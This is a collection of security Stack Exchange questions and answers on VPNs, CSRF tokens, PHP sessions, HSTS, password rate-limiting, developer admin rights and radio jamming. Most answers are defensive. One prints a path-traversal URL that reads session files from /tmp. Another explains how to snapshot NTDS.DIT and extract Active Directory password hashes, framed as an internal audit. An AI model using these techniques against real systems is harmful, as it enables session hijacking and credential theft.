<li>If I talk directly to site C over an encrypted connection (e.g. over SSL), a network admin sees ""A said 'oewqhfch' to C"" (where 'oewqhfch' is 'hello', but encrypted; the network admin can't decrypt it)</li>
<li>If I use B as a simple unencrypted proxy to talk to C (i.e. I'm not encrypting what I say to B), the admin sees ""A said 'Tell C ""hello"" and send me C's response' to B""</li>
<li>If I use B as an unencrypted proxy but encrypted my communication to C, the admin would see ""A said 'Tell C ""oqewqer"" and send me the response' to B"" (this is uncommon)</li>
<li>If I use B as a VPN (encrypted connection to B), the admin sees ""A said 'ewqrvqfqjpocn' to B"". B then decrypts that to see that A asked it to ""Tell C 'hello' and send me the response"", but the administrator of A's network doesn't know that A said that.</li>
</ul>

<p>So, a VPN gives the benefit that everything you're <em>doing</em> on the VPN is hidden from the administrator of your network; the idea is to make it as though you were directly connected to the VPN provider's network. But your network administrator still sees that you're talking to the VPN server, because they have to route your packets to and from that server.</p>
","72250"
"CSRF Token in GET request","15912","","<p>According to the OWASP testing guide a CSRF token should not be contained within a GET request as the token itself might be logged in various places such as logs or because of the risk of shoulder surfing. </p>

<p>I was wondering if you only allow the CSRF token to be used once, (so after one request it's invalidated) would this still be insecure? Considering that by the time someone logs the token, it will already be invalidated and unusable should the attacker want to perform CSRF.</p>
","<p>If you're generating the tokens in a secure random fashion, then an attacker cannot infer the next token from the previous ones. So there shouldn't be any realistic risk.</p>

<p>Another important point here is to use SSL. Any proxies/reverse proxies between the user and the server cannot even see the GET parameters to log them. The only places where the token is logged is on the two ends of the SSL connection.</p>

<p>Logging on the user's end (History, for example) happens after the link is clicked. Logging on the server's end carries no risk (if you don't trust the place where the SSL traffic is decrypted, then there are bigger problems).</p>
","36681"
"Where and How is data stored in a session?","15906","","<p>Where is the information in the fields of a session stored? If I, for instance, store in a session something like <code>$_SESSION['foo'] = 'bar'</code>. Where is ""bar"" stored?</p>

<p>If I store an object of a class, in wich way is it stored? Like <code>$_SESSION['kart'] = new Kart(10)</code>. Could someone get the information stored in that class? How?</p>

<p>Could the legitimate owner of that session modify the value of the field ""foo""?</p>

<p>And, could someone change the value of the field ""foo"" in an already created session of other user?</p>
","<p>This depends on the webserver used. If we take PHP on Unix as an example it may store the session on the filesystem in the /tmp folder. It creates a file here with the name of the users session ID prefixed with sess_ (Example: /tmp/sess_9gk8f055hd61qll6a8pjpje2n2).The contents of the session can be optionally encrypted before being placed on the browser. For Apache sessions (not necessarily PHP) you may use the mod_session_crypto module (<a href=""http://httpd.apache.org/docs/trunk/mod/mod_session.html"" rel=""nofollow"">Read more here</a>).</p>

<p>The owner of the session can not change the session variables as he feels like unless the application allows him to do it. The application logic has to provide means to change the session in order for the user to change the variables.</p>

<p>The session object is never transmitted to the client and only a reference to the session (e.g. PHPSESSID) is passed to the client. The session ID should have high entropy and minimum 16 bytes of length in order to be very hard to guess. See <a href=""https://www.owasp.org/index.php/Top_10_2010-A3"" rel=""nofollow"">OWASP Top 10 - Broken authentication and session management</a> for more information about that. Also see this <a href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet"" rel=""nofollow"">OWASP Cheat sheet</a> for specific information on how to secure sessions.</p>

<p><strong>Attacks against session storage:</strong></p>

<p>If there exists a flaw like for example LFI (Local File Inclusion) it may be possible for an attacker to read their own and other users session objects by including the file on the file system. For example if the following example worked I could possibly read my own session data: </p>

<pre><code>http://&lt;victim&gt;/?page=../../../../../../../../tmp/sess_&lt;my sessionid&gt;
</code></pre>
","19054"
"Unsubscribe safely","15895","","<p>I have heard that is better to never click to any link in an email. Is it a bad idea to click to a unsubscribe link? What is the best way to unsubscribe to undesired mails?</p>
","<p>You should not click on any links. By clicking on the ""unsubscribe"" link you probably get marked as ""Active Reader"" which is willing to interact. You also get on the page of the sender, which might could infect you with malware.</p>

<p><strong>Remember: With clicking on any link you've confirmed to the sender that your email address is both valid and in active use.</strong></p>

<p>Just delete and ignore it. Your email then might get marked as ""inactive"".</p>
","92723"
"CSRF protection and Single Page Apps","15883","","<p>I am in the process of writing a thick client web app using Angular.js (single page app) and was wondering what are the best practices for securing the app using a CSRF token.</p>

<p>Should I send a CSRF token when the app is first loaded then re use that token on every request? Should I have a mechanism to refresh the token? Are there other protections rather than a CSRF token that would make more sense for a single page app?</p>
","<p>Well here is how I ended up implementing CSRF:</p>

<p>On the first request, sets a CSRF token as a cookie. Every subsequent AJAX requests include the CSRF token as a <code>X-CSRF-Token</code> HTTP header.</p>

<p>Django has some nice documentation on how to do this cleanly with jQuery: <a href=""https://docs.djangoproject.com/en/dev/ref/contrib/csrf/"" rel=""nofollow noreferrer"">https://docs.djangoproject.com/en/dev/ref/contrib/csrf/</a></p>

<p>Edit: An alternative approach whitelists requests that contain the <code>X-Requested-With</code> header. It seems that's <a href=""https://github.com/rails/rails/blob/18d19bf2a418f4e310e7792db6d8600c25f8b1b3/actionpack/lib/action_dispatch/http/request.rb#L211-L217"" rel=""nofollow noreferrer"">what Rails does</a>. But as @damio pointed out below, the <code>X-Requested-With</code> is a security hazard, <a href=""https://www.djangoproject.com/weblog/2011/feb/08/security/"" rel=""nofollow noreferrer"">Django and Rails reverted</a> back to not using it and forcing a token.</p>
","36485"
"High-frequency noise deterrents","15874","","<p>I've found that walking past certain boutique stores in my city that some places have installed very loud high-frequency noise generators. These cause a fair amount of discomfort for passers by that are able to hear them.
My understanding is that younger people are able to hear these frequencies clearly but people over certain ages have usually lost the ability to hear them.</p>

<ul>
<li><p>What is the purpose of these devices? I assume to deter people from loitering around but i could be wrong.</p></li>
<li><p>Is there any information available as to how well these work as deterrents? </p></li>
</ul>
","<p>These devices you describe are also known as <em>teen-repellents</em> and take advantage of a well know fact that our <a href=""https://en.wikipedia.org/wiki/Presbycusis"" rel=""nofollow noreferrer"">hearing frequency range deteriorates with age</a>, while it's not yet fully developed in pre-teen age. The most effective age range such devices could target is somewhere in the range of 12 to 24 years, and <a href=""http://movingsoundtech.com/"" rel=""nofollow noreferrer"">some such devices</a> have various settings for <em>crowd control</em> of any age, too.</p>

<p>They cause high-pitched, high frequency noise in the range of roughly 17.5 kHz and up, limiting its <em>influence</em> to mostly teenagers. Several manufacturers exist already, and since it's not a technically challenging device to make, I suspect many may have made their own versions, too. The whole idea probably comes from research in perimeter alarms, where some use rapidly changing frequency high volume noise in a bid to <em>disturb burglar's orientation</em> (our inner ear).</p>

<p>You could test your hearing of these high frequency sounds online, for example with <a href=""https://www.youtube.com/watch?v=H-iCZElJ8m0"" rel=""nofollow noreferrer"">this YouTube clip</a>, or <a href=""https://www.youtube.com/watch?v=AXhRmv1mrs4"" rel=""nofollow noreferrer"">a faster one here</a> to see how much of an effect these devices would have on you. Make sure you select the highest quality setting (video quality and audio quality are coupled on YouTube), otherwise some extreme frequencies might get lost with compression.</p>

<p>So what is the point of these devices? Mainly, they serve as <em>anti-loitering</em> devices for public places where gathering of greater number of teenagers is not desirable, such as luxury departments in shopping malls, adult <em>red district</em> areas (not confirmed), and other places where masses of teenagers would potentially create a <em>disturbance</em> (rollerskating, loitering, whichever is considered as undesirable behaviour by us <em>adults</em>).</p>

<p>As you have probably already anticipated by now, they're highly controversial and have caused a public outcry in many countries that tend to respect human rights, defend and uphold civil liberties, or are otherwise concerned by too big of an influence of corporations on general population.</p>

<p>One such device is <a href=""http://movingsoundtech.com/"" rel=""nofollow noreferrer""><em>Mosquito Anti Loitering</em> made by MST</a>. The page there describes more about what it's supposed to do and where to use it (that's a job for advertisers really, so best left to them). Needless to say, they left out all the bad about it, and don't address questions such as how does it affect animals and if, in what way, is it effective (<em>street punks</em> might be less sensitive to these sounds simply because they probably wouldn't care so much to lose their hearing abilities and rather stand next to the loudspeakers in loud concerts - to hear it better of course, while the ones it would work better on would probably be the quiet, library goer types), if it can cause <a href=""https://en.wikipedia.org/wiki/Nausea"" rel=""nofollow noreferrer"">nausea</a> or similar discomfort even to generations that wouldn't be able to hear these noises (just because it's beyond our hearing range, doesn't mean it doesn't have a real physical effect on us), or indeed, if it can be considered safe to pregnant women and their unborns.</p>

<p>A proper article about these devices can also be found <a href=""http://www.huffingtonpost.com/2008/04/23/high-pitch-only-teens-can_n_98304.html"" rel=""nofollow noreferrer"">here</a>. So far, it seems, more money went into advertising these devices than actually determining their effect on our health (or health and change in behavioral patterns of other species, like e.g. dogs, cats, horses and birds). This is certainly one of those things we'll still need to properly address in the near future, while in the meantime their producers and advertisers will gladly exploit the fact that we didn't.</p>

<p><strong>Teenagers strike back</strong></p>

<p>UPDATE: I was reminded of an interesting bit of information relevant to this thread by <a href=""https://security.stackexchange.com/users/655/thomas-pornin"">@ThomasPornin</a> in the comments below. Thanks Thomas! What follows is a <a href=""http://tvguide.lastown.com/bbc/preview/dara-o-briains-science-club/episode-6.html"" rel=""nofollow noreferrer"">partial transcript (full transcript available in link)</a> from episode 6 of <a href=""http://www.bbc.co.uk/programmes/p00zxmqd"" rel=""nofollow noreferrer"">Dara Ó Briain's Science Club</a>, where it was also mentioned:</p>

<blockquote>
  <p>This phenomenon became very well-known, by the way, because some
  company marketed an alarm that shopkeepers could play outside their
  shops to clear teenagers from in front of the shop, because only
  teenagers could hear it. My favourite thing about it is that the
  teenagers recorded the tone and used it as a ringtone on their phone,
  because teachers can't hear it in school. So, they can actually phone
  each other in class, which I think is genius.<sup>[1]</sup></p>
</blockquote>

<p><sup>[1] <a href=""https://en.wikipedia.org/wiki/Dara_%C3%93_Briain"" rel=""nofollow noreferrer"">Dara Ó Briain</a>, <a href=""http://www.bbc.co.uk/programmes/p00zxmqd"" rel=""nofollow noreferrer"">Dara Ó Briain's Science Club</a>, <a href=""http://tvguide.lastown.com/bbc/preview/dara-o-briains-science-club/episode-6.html"" rel=""nofollow noreferrer"">Episode 6, 0:28:59.00 - 0:29:26.64</a></sup></p>

<p>So there we have it, a comical <a href=""https://en.wikipedia.org/wiki/Cause_and_effect"" rel=""nofollow noreferrer"">cause and effect</a>, as <a href=""https://security.stackexchange.com/users/28/steves"">@SteveS</a> also pointed out in the comments (one of the first members of <a href=""https://security.stackexchange.com/"">IT Security</a> by the way). I didn't link to any available online video clips, as they're of course all copyrighted and/or might not be available in all countries (e.g. <a href=""http://www.bbc.co.uk/iplayer/tv"" rel=""nofollow noreferrer"">BBC iPlayer</a>). Do try to find them though, they're most interesting to watch and come with a fair bit of science &amp; technology related <a href=""https://en.wikipedia.org/wiki/Sitcom"" rel=""nofollow noreferrer"">situational comedy</a> on top of factual information and personal opinions of some of the best scientists of today.</p>
","35199"
"How are GPUs used in brute force attacks?","15874","","<p>I have read that GPUs can be used in brute force attacks? But how can this be done and is there a need for any other hardware devices (hard disks for instance)?</p>

<p>Note: I'm more interested in web application security, but I don't want to put on blinders. I'm sorry if my question is ridiculous for you, but my hardware background isn't very good. I just know how basic components work together and how to combine them.</p>
","<p>I'm choosing to assume you're asking why it's a risk rather than how to hack.</p>

<p>GPUs are very good at parallelising mathematical operations, which is the basis of both computer graphics and cryptography. Typically, the GPU is programmed using either <a href=""https://en.wikipedia.org/wiki/CUDA"">CUDA</a> or <a href=""https://en.wikipedia.org/wiki/OpenCL"">OpenCL</a>. The reason they're good for brute-force attacks is that they're orders of magnitude faster than a CPU for certain operations - they aren't intrinisically smarter.</p>

<p>The same operations can be done on a CPU, they just take longer.</p>
","118151"
"How can I avoid putting the database password in a perl script?","15842","","<p>I have a cronned Perl script that connects to our database and does various kinds of lookups and integrity checks. The original script was written by someone long ago. My job is to make some changes to it. But I really don't like staring at the <code>username=""foo"", password=""bar""</code> parameters hard-coded in there for accessing the database.</p>

<p>There's got to be a more secure way of doing this. All I could think of to do for now is to comment out the cron job, delete the line in the script that had the password, and start brainstorming about how to make this more secure. But meanwhile the things the script does have to be done by hand.</p>

<p>Any ideas? </p>
","<p>The standard way is to put the credentials into a config file, and attempt to protect the config file from being more readable than the perl file.  This offers a moderate increase in security; for example, the code may be in source control and accessible to developers, the config file wouldn't be.  The code needs to be in the web server's cgi root, and possibly downloadable under certain misconfigurations, and the config file needn't be.</p>

<p>The ambitious way is to reversibly encrypt the credentials and put them into a config file.  Of course, anything reversibly encrypted can be decrypted.  The BladeLogic application did this, and it was trivial (&lt;1 day) for me to de-compile their Java enough to find out the function to decrypt credentials and use it to decrypt them to my satisfaction.  Not a mark against them; that's just the name of the reversibly encrypted game.</p>

<p>Another option is to use OS-based authorization in concert with strictly limited database restrictions.  For example, limit the database client user's access to a set of stored procedures to limit the potential for abuse, and allow that user to access the database without a password.  This doesn't work if you're doing client-server over the network, which limits how often it's useful.  Also, people tend to look more askance at ""passwordless"" OS-user access than they do at writing the password down willy-nilly.  It is not completely logical, but there are standards that say all database users must have passwords, so that's that.</p>
","20462"
"Extract Password Hashes from Active Directory LDAP","15841","","<p>Currently we are working on a monthly internal security test which among other should contain a verification of the real password strength the users choose. For this reason I want to extract the password hashes of all users via LDAP. Everything I found was <a href=""https://social.technet.microsoft.com/Forums/windowsserver/en-US/63e3cf2d-f186-418e-bc85-58bdc1861aae/view-password-hash-in-active-directory?forum=winserverfiles"" rel=""nofollow"">this</a> technet discussion telling me I cant extract the hashes even not as an Administrator which I really can't (don't want) to believe. </p>

<p>Is there any way to extract the password hashes from an Active Directory Server?</p>

<p>What we want to do is extracting the hashes though we can run a syllable attack against them to verify if the passwords are really or just technically good.</p>
","<p>You need to get the <code>NTDS.DIT</code> binary file out of <code>%SystemRoot%\ntds</code>. </p>

<p>You can use <code>ntdsutil</code> to create a snapshot of the AD database so that you can copy <code>NTDS.DIT</code>.</p>

<p>Then you can use something like the Windows Password Recovery tool to extract the hashes.</p>

<p><a href=""https://technet.microsoft.com/en-us/library/cc753343.aspx"" rel=""nofollow"">https://technet.microsoft.com/en-us/library/cc753343.aspx</a></p>

<p><a href=""https://technet.microsoft.com/en-us/library/cc753609(WS.10).aspx"" rel=""nofollow"">https://technet.microsoft.com/en-us/library/cc753609(WS.10).aspx</a></p>

<p><a href=""http://www.passcape.com/windows_password_recovery"" rel=""nofollow"">http://www.passcape.com/windows_password_recovery</a></p>
","100282"
"Dangers of opening up a wide range of ports? (mosh)","15840","","<p>Why do we generally configure firewalls to filter out all traffic that we don't specifically allow?  Is this just an extra layer of security for defense-in-depth that buys us nothing if we are not running malware on our system?</p>

<p>Are there any dangers in say opening up say ports 60000 to 61000 for incoming UDP connections that is significantly less safe than say just opening up a few ports?  </p>

<p>I've just heard of <a href=""http://mosh.mit.edu"" rel=""nofollow noreferrer"">mosh</a> which advertises itself as a better way to do mobile ssh (over wifi/cell phone).  Mosh uses UDP rather than TCP, so if you briefly enter a tunnel or your IP address changes (switching cell phone towers), you don't have to wait to come back from congestion control  or establish a new ssh session.  Basically mosh uses ssh to remotely start a mosh-server as an unprivileged user, exchanges a AES-OCB key using ssh, and then sends/receives encrypted packets (with sequence numbers) to a port in the range 60000-61000, which you should configure your firewall to open.</p>

<p>I'm somewhat uncomfortable with opening up ~1000 ports for incoming (UDP) connections, but can't think of a very good reason for this.  If no software is listening for data on that port, it just gets ignored right?  (On edit: no -- it actually directs the server to send back a ICMP (ping) destination unreachable response).  I guess if I had malware running on my server, it could be waiting to listen to instructions from forged IP addresses on one of these opened ports.  However, malware running on an internet connected systems already could establish connections/download information from other malware servers (though would have to know an IP address) and fetch instructions, so this doesn't make the security that much less secure. </p>

<p>EDIT: Interesting, just saw this <a href=""https://security.stackexchange.com/questions/13703/udp-flood-attack-false-positive"">other question</a> which lead me to read about <a href=""http://en.wikipedia.org/wiki/UDP_flood_attack"" rel=""nofollow noreferrer"">UDP_flood_attack</a>.  I guess additionally I would need to somehow disable my system from sending ping destination unreachable replies for the newly opened UDP ports.</p>
","<p>In addition to Justin's answer about inadvertently opening up applications to be remotely accessed, remember that even if nothing is specifically listening for a connection, the operating system is ALWAYS going to be listening -- if only to route/map to the appropriate process or refuse or silently drop the packet.  Therefore, the operating system is still one specific attack vector  which can remain unprotected when a firewall allows traffic to flow to an ""inactive"" port.</p>

<p>However, all things being equal in this scenario, opening up one inactive port or 1000 inactive ports makes little difference.  But definitely heed the advice of principle of least privilege.</p>
","13715"
"Why use HTTPS Everywhere when we have HSTS supported browsers?","15838","","<p>I know that the browser's default protocol to access any site is <code>http://</code> when <code>https://</code> is explicitly not mentioned, but even then if we browse to a website say <code>www.facebook.com</code>, the response header from the Facebook servers would have <a href=""https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"" rel=""noreferrer"">HSTS</a> mentioned and our browser would direct us from <code>http://</code> to <code>https://</code> so why do we need another plugin to do this when browser itself does this for the user? What is the purpose of <a href=""https://en.wikipedia.org/wiki/HTTPS_Everywhere"" rel=""noreferrer"">HTTPS Everywhere</a> when our browser does it's job by default.</p>
","<blockquote>
  <p>even then if we browse to a website say www.facebook.com, the response header from the Facebook servers would have HSTS mentioned</p>
</blockquote>

<p>I made a <code>curl</code> request to <code>http://www.facebook.com</code> and this is what I got:</p>

<pre><code>&lt; HTTP/1.1 302 Found
&lt; Location: https://www.facebook.com/
&lt; Content-Type: text/html
&lt; X-FB-Debug: zgK/A+8XSlghi/vWvAivsZ04gawpdr+3BuO7yuQaKDdrP/+B14oSVDSreHh0GbchyNPnav39pQq9Zgw5mSXX5A==
&lt; Date: Sat, 29 Apr 2017 19:23:25 GMT
&lt; Connection: keep-alive
&lt; Content-Length: 0
</code></pre>

<p>As you can see there is no HSTS header here, because according to its specification <a href=""https://tools.ietf.org/html/rfc6797#section-7.2"" rel=""noreferrer"">(RFC6797)</a>:</p>

<blockquote>
  <p>An HSTS Host MUST NOT include the STS header field in HTTP responses
     conveyed over non-secure transport.</p>
</blockquote>

<p><a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"" rel=""noreferrer"">Web browsers also ignore HSTS headers</a> in HTTP responses:</p>

<blockquote>
  <p><strong>Note:</strong> The Strict-Transport-Security header is ignored by the browser when your site is accessed using HTTP; this is because an attacker may intercept HTTP connections and inject the header or remove it.  When your site is accessed over HTTPS with no certificate errors, the browser knows your site is HTTPS capable and will honor the Strict-Transport-Security header.</p>
</blockquote>

<p>The purpose of HSTS is to tell the client NOT to switch to HTTP once it has accessed a website over HTTPS, and not the other way round. From <a href=""https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"" rel=""noreferrer"">Wikipedia</a>:</p>

<blockquote>
  <p>HTTP Strict Transport Security (HSTS) is a web security policy mechanism which helps to protect websites against protocol downgrade attacks and cookie hijacking.</p>
</blockquote>

<p><a href=""https://en.wikipedia.org/wiki/Downgrade_attack"" rel=""noreferrer"">Protocol downgrade attack</a>:</p>

<blockquote>
  <p>A downgrade attack is a form of attack on a computer system or communications protocol that makes it abandon a high-quality mode of operation (e.g. an encrypted connection) in favor of an old, lower-quality mode of operation (e.g. clear text) that is there for backward compatibility with older systems.</p>
</blockquote>

<p>So a HSTS header isn't used to redirect a new HTTP connection to HTTPS, but rather to prevent a browser from making HTTP requests to an existing HTTPS site.</p>

<p>The <a href=""https://www.eff.org/https-everywhere"" rel=""noreferrer"">HTTPS Everywhere</a> plugin on the other hand ensures the web browser makes HTTPS connections to websites that support HTTPS, but are also accessible over HTTP.</p>

<blockquote>
  <p>Many sites on the web offer some limited support for encryption over HTTPS, but make it difficult to use. For instance, they may default to unencrypted HTTP, or fill encrypted pages with links that go back to the unencrypted site. The HTTPS Everywhere extension fixes these problems by using clever technology to rewrite requests to these sites to HTTPS.</p>
</blockquote>
","158418"
"Why hasn't it become the norm to inhibit repeated password guesses?","15831","","<p>Everyone is aware of the convention/need for strong passwords.  With the number of different kinds of clues people can use in their passwords, plus the various permutations of caps and digit-letter substitution, a hacker would need to make many attempts on average, in order to get the successful password.</p>

<p>This link:  <a href=""https://security.stackexchange.com/questions/40996/slowing-down-repeated-password-attacks"" title=""Slowing down repeated password attacks"">Slowing down repeated password attacks</a>
discusses some effort to discourage all that guessing, although it's not the same question I have:  Why hasn't it become the norm to interfere with repeated guesses?  An increasing backoff time after each wrong guess is one way, and others have been discussed.</p>

<p>I have seen very few attempts to inhibit such guessing on Linux systems, or any web-based authentication.  I have been locked out of one system when I got it wrong 3 times.</p>

<p>IT folks impose more and more constraints, like character count, letters, digits, caps, and exclusion of user name from password.  But that simply increases the number of needed attempts in a situation where the number is not really restricted.</p>
","<p>I'd like to challenge your assumption that this <em>isn't</em> being done.</p>

<p><em>[warning: wild approximations to follow]</em></p>

<p>Remember that a successful brute-force attack will require millions or billions of guesses per second to do the crack in a reasonable amount of time (say, a couple hours to a month depending on the strength of your password). Even a rate-limit of 100 password attempts per second would increase the crack time from a month to hundreds of thousands of years. Maybe my standards are low, but that's good enough for me, and no human user legitimately trying to get into their account will ever notice it. Even better if the rate-limit was by IP rather than by username just to prevent some kinds of Denial-Of-Service attacks.</p>

<p>Also, I don't know which Linux distribution you're using, but on my Ubuntu and CentOS systems, when I mistype my password at either the GUI or terminal login screens, it locks for 1 second before re-prompting me.</p>

<hr>

<p>Even if the server isn't actively rate-limiting login attempts (which they really should be), just the ping time by itself is enough to slow you down to millions of years. You'll probably DDOS the server before getting anywhere close to 1 billion guesses / second. The real money is in getting a copy of the hashed passwords database and feeding that into a GPU rig where billions of guesses per second are possible.</p>

<p><strong>TL;DR:</strong> if you are going to put effort into hardening your login server, you'll get more bang for your buck by improving your password hashing, and making your database hard to steal than by implementing rate-limiting on your login screen.</p>

<hr>

<p><strong>UPDATE</strong>: Since this went viral, I'll pull in something from the comments: </p>

<p>This logic only applies to login servers. For physical devices like phones or laptops, a ""3 attempts and it locks"" or a ""10 attempts and the device wipes"" type thing still makes sense because someone could shoulder-surf while you're typing your password, or see the smudge pattern on your screen, or know that a 4-digit PIN only has 10,000 combinations anyway, so the number of guesses they need to do is <em>very very</em> much smaller.</p>
","149996"
"Risks of giving developers admin rights to their own PCs","15812","","<p>I need to convince my internal IT department to give my new team of developers admin rights to our own PCs. They seem to think this will create some security risk to the network. Can anyone explain why this would be? What are the risks? What do IT departments usually set up for developers who need ability to install software on their PCs.</p>

<blockquote>
  <p>This question was <strong><a href=""https://security.meta.stackexchange.com/questions/792"">IT Security Question of the Week</a></strong>.<br/>
  Read the June 8, 2012 <strong><a href=""http://security.blogoverflow.com/2012/06/qotw-29-risks-of-giving-developers-admin-rights-to-their-own-pcs/"" rel=""nofollow noreferrer"">blog entry</a></strong> for more details or <strong><a href=""https://security.meta.stackexchange.com/questions/tagged/qotw?sort=newest"">submit your own</a></strong> Question of the Week.</p>
</blockquote>
","<p>At every place I have worked (as a contract developer) developers are given local admin rights on their desktops. </p>

<p>The reasons are:</p>

<p>1) Developers toolsets are often updated very regularly.  Graphics libraries, code helpers, visual studio updates; they end up having updates coming out almost weekly that need to be installed.  Desktop support usually gets very tired of getting 20 tickets every week to go install updated software on all the dev machines so they just give the devs admin rights to do it themselves.</p>

<p>2) Debugging / Testing tools sometimes need admin rights to be able to function.  No admin access means developers can’t do their job of debugging code. Managers don't like that.</p>

<p>3) Developer tend to be more security conscious and so are less likely to run/install dangerous malware. Obviously, it still happens but all in all developers can usually be trusted to have higher level access to be able to do their work.</p>
","14977"
"Strategies against jamming attacks?","15811","","<p>We have some devices which are designed to use standard frequencies/protocols, such as GSM, CDMA, GPS, Wifi and Bluetooth, among others. While our focus is not thought to be used for high-profile criminals (such as organized crime) who will often use jammers, we are aware that this is, to our knowledge, the weakest link in our system. Thankfully it is a weak link that is very rarely exploited by the more common adversaries found in our adversary model, and we do not pretend to handle situations for such cases.</p>

<p>So, while this is not really a practical issue, as a technical person I can't wonder but think if there's any way that we could actually protect against jammers while still using common protocols.</p>

<p>Is there any strategy? This is not my area of expertise, so I am nearly clueless, but as far as I know, frequencies that are high enough in the spectrum are reserved for other uses, so we can't even change to them, and strategies like frequency hopping don't work with said protocols. I'm lost, to be honest.</p>

<p>EDIT: There were many excellent responses and I wish I could have accepted two of them. Thank you.</p>
","<h2>Jamming is used either by fools or by clever professionals.</h2>

<ul>
<li>The jammer can be triangulated by professional-level direction-finders (see source of this answer for a sample link) in half no time (unless special steps are taken by the attacker)
</li>
<li>What is jammed cannot be eavesdropped (okay, it's not as easy as that, but will suffice for the simplest case)</li>
<li>Jamming forces the jammed parties to switch to Plan B which may be less prone to interception/interference</li>
</ul>

<h2>Why do clever professionals use jamming?</h2>

<ul>
<li>To gain tempo in a fast-paced situation (like a physical attack)</li>
<li>To deny the adversary the opportunity to communicate time-critical information</li>
</ul>

<h2>What do you do if confronted (or possibly confronted) with RF kiddies?</h2>

<ul>
<li>Jamming outside of law enforcement and the military is highly illegal. <strong>Contact the relevant government authorities</strong>. In advanced countries radio spectrum is being monitored almost continuously and almost in all high-value locations. While you won't be able to get in touch with those who do the monitoring and provide quick response easily, your communications regulators will be able to do that (subject to vagaries of bureaucratic nature).</li>
<li>Be prepared to switch to another mode of communication/radio band: VSATs, sat phones, troposcatter, Ham Radio modems, landlines.</li>
</ul>

<h2>What if you are against smart professionals?</h2>

<ul>
<li>Plan your communications and responses long before you have to act.</li>
<li>Chances are you are way behind the reaction curve when professionals resort to jamming.</li>
<li><strong>Do not rely on communications</strong>. Rehearse standard operating procedures and drills. Make sure you can guess what your buddy does next without going on air.</li>
</ul>

<p>If you still want to design jamming-resistant protocols, please consider winning a government/military contract, hiring a bunch of smart professionals, learning plenty of stuff about electronic warfare etc. etc.</p>
","41128"
"Is Visa PayWave secure?","15799","","<p>Recently (well, a few months or even a year ago), my bank, here in Australia, introduced this PayWave technology to their Visa debit cards. They claim it's secure, but all they talk about is their policies, which requires you to notice that there's a problem (From the <a href=""http://www.visa-asia.com/ap/au/cardholders/paywave/index.html"">website</a>):</p>

<blockquote>
  <p>Visa payWave-enabled cards are backed by Visa's Zero Liability Policy1
  and are as secure as any other Visa chip card. They carry the same
  multiple layers of security, which ensures that you are not
  responsible for fraudulent or unauthorised transactions.</p>
</blockquote>

<p>It obviously doesn't carry the same layers of security, as you don't have to use your PIN or signature. Well, for purchases under $100, but even that is a lot of money to some people (any amount is a lot to me), so it's a bit weird to say that anything under that is a ""low-value"" purchase for <em>anyone</em>. If a homeless person found/stole my card, I don't see them buying anything above that.</p>

<p>Someone I was talking to even suggested that a person could walk down the street with one of these PayWave machines in their bag, and bump it against other people's bags in the hopes of finding a compatible card.</p>

<p>It sounds like they're sacrificing security for convenience, and underestimating the ingenuity of thieves. I can't seem to find any information that isn't advertising or otherwise biased, and I don't have any expertise in this area at all to tell the difference between a legitimate concern and paranoia. Is Visa PayWave as secure as it claims?</p>
","<p>The secret of credit card transaction security is that by law (in many jurisdictions) the card issuer is responsible for fraudulent transactions after a certain limit, not the card holder. Since they already assume the bulk of the liability, most (all?) simply make the jump to say that the card holder is not responsible under any circumstances for fraud.</p>

<p>This means that card security is simply a cost-benefit trade-off for the issuer. It's worth the cost for the issuer of writing off a certain amount of fraud if in exchange they get a reasonable return for the policy. Hence the $100 limit; Visa is confident that within that range, they can detect fraud reliably enough to make it worth their while to remove certain security measures.</p>

<p>Therefore, whether or not it's secure is <em>their</em> problem, not yours. Obviously you have to actually <em>report</em> suspicious transactions. This makes it a bad idea to keep an account open that you don't monitor. But that has always been the case.</p>

<p><em>This is really the way it should be. If the party liable for security is the one in the best position to implement it, then the level of security you get tends to be appropriate for the value of the thing that's being secured.</em></p>
","24360"
"Company computers for competent developers, how can you deal with them?","15797","","<p>This is a follow up on <a href=""https://security.stackexchange.com/questions/102536/is-there-a-legitimate-reason-i-should-be-required-to-use-my-companys-computer"">Is there a legitimate reason I should be required to use my company’s computer</a>.  Mostly, because I see a huge issue in a couple of specific situations.</p>

<p>Had I been in a position of the security engineer for an organization I would definitely put a policy that only company computers shall be used.  That does make sense, and protects not only company data but the liability of employees.</p>

<p>Yet, there is one case in which such a policy bugs me:  A competent developer (I'm not talking about a junior developer, I'm talking about a middle to senior level developer) will potentially have on his work machine:</p>

<ul>
<li>17 database engines;</li>
<li>20 docker containers;</li>
<li>10 test virtual machines (let's say using something like <code>qemu</code>).</li>
</ul>

<p>That is a very common scenario in startups and post-startups (a startup that managed to survive several years).  Moreover, this developer will be changing his docker containers and virtual machines every week, since he will probably be testing new technology.</p>

<p>Requiring this developer to refer to the security engineer to install new software every time is completely impractical.  Moreover, since a company would have more than one such developer, going with the typical <strong>company managed computers for everyone</strong> involves drawbacks:</p>

<ul>
<li>Maintaining the computers of, say, six such developers is a full time job for a competent security engineer.</li>
<li>The manager of those developers will be terribly angry because what his team is doing for 50% of their work-time is to wait for the security engineer.</li>
</ul>

<p>On the other hand allowing the developers to use the machines freely is dangerous: one rogue docker container or virtual machine and you have an insider.  I would even say that these developer's computers are <em>more dangerous</em> than that of a common user (say, a manager with spreadsheet software).</p>

<hr>

<p><strong>How do you make sensible policies for competent developers?</strong></p>

<p>Here are some other solutions I could think of (or saw in the past), most of which were pretty bad:</p>

<ol>
<li><p>Disallow internet access from the development machines:</p>

<ul>
<li>You need internet access to read documentation;</li>
<li>You need to access repositories, often found on the internet.</li>
</ul></li>
<li><p>Give developers two computers, one for internet and one for development machines:</p>

<ul>
<li>Complaints about lost productivity: typing <code>Alt+2</code> to get the browser is faster than switching to another computer;</li>
<li>Repository access is cumbersome: download in one place, copy to the other.</li>
<li>Encourages the developer to circumvent the security and make a USB-based connection between both machines, so he can work from a single computer (saw it happening more than once).</li>
</ul></li>
<li><p>Move development to the servers (i.e. not development on desk machines):</p>

<ul>
<li>This is just moving the same problem deeper, now the rogue container is on the server;</li>
<li>Arguably worse than allowing the developer to do what he pleases on his own machine.</li>
</ul></li>
</ol>

<p>There must be a better way.</p>
","<p><strong>Separate development and production</strong></p>

<p>It is usual practice to give developers local admin / root rights on their workstation. However, developers should only have access to development environments and never have access to live data. Sys-admins - who do have access to production - should have much more controlled workstations. Ideally, sys-admin workstations should have no Internet access, although that is rare in practice.</p>

